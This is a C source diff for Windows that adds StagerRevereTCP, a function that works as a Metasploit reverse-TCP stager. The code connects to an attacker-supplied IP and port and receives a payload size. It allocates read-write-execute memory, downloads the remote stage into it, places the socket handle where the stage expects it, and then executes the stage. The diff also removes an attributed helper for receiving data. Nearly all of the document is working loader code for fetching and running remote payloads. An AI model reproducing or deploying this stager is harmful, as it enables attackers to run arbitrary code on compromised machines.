@@ -61,23 +61,46 @@ SOCKET get_socket(wchar_t* IP, wchar_t* iPort)  // MSDN http://msdn.microsoft.co
 	return SocketToHandler;
 } 
 
-// The author of the code below is Raphael Mudge (raffi@strategiccyber.com),
-// https://github.com/rsmudge/metasploit-loader
-int recv_all(SOCKET socket, unsigned char* buffer, int len) {
-	int    tret   = 0;
-	int    nret   = 0;
-	unsigned char* startb = buffer;
-	while (tret < len) {
-		nret = recv(socket, (char *)startb, len - tret, 0);
-		startb += nret;
-		tret   += nret;
-/*
-		if (nret == SOCKET_ERROR)
-		{
-			dprintf(L"[-] Error receiving data! WSAGetLastError: %d\n", WSAGetLastError());
-			exit(1);
-		}
-		*/
+
+void StagerRevereTCP(wchar_t* IP, wchar_t* iPort)
+{
+	SOCKET sckt;
+	int len = 0;
+	char* buff;
+	int count = 0;
+
+	sckt = get_socket(IP, iPort); // connect
+	if (sckt == INVALID_SOCKET) //Couldn't connect
+	{
+		dprintf(L"[-] Failed to connect ... will exit!\n");
+		exit(1);
 	}
-	return tret;
+	dprintf(L"[+] Socket: %d\n", sckt);
+
+	dprintf(L"[*] Connecting \"%s:%s\"\n", IP, iPort);
+
+	count = recv(sckt, (char*)&len, 4, NULL); //read 4 bytes ... the first 4 bytes sent over from the handler are size of stage
+	if (count != 4 || len <= 0) 
+	{
+		dprintf(L"[-] We connected, but something went wrong while receiving stage size ... will exit!\n");			
+		exit(1);
+	}
+
+	dprintf(L"[*] Stage length = \"%d\" bytes.\n", len);
+	buff = (char*)VirtualAlloc(0, len + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE) ; //allocate
+	if (buff == NULL)
+	{
+		dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", GetLastError());
+		exit(1);
+	}
+
+	dprintf(L"[*] Success! \"%d\" bytes allocated.\n", (len + 5));
+	// Getting the stage
+	recv(sckt, buff + 5, len, MSG_WAITALL); // not specifying MSG_WAITALL caused me two days of headache ...
+	dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buff);
+	buff[0] = 0xBF;
+	dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
+	memcpy(buff+1, &sckt, 4);
+	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
+	(*(void (*)())buff)();//Bye bye ...
 }
